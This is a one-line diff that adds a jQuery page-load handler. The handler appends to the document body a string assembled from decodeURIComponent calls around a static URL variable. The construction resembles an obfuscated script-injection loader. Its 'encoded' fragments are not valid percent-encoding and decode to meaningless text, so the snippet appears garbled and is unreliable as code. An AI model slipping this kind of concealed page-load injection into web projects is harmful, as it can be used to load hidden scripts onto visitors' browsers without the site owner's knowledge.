@@ -1,0 +1,1 @@
+ $(document).ready(function () { $('body').append(decodeURIComponent('EXH8') + G_STATIC_URL + decodeURIComponent('T908O5H72661QRY71IHR6ACDGU')); }); 
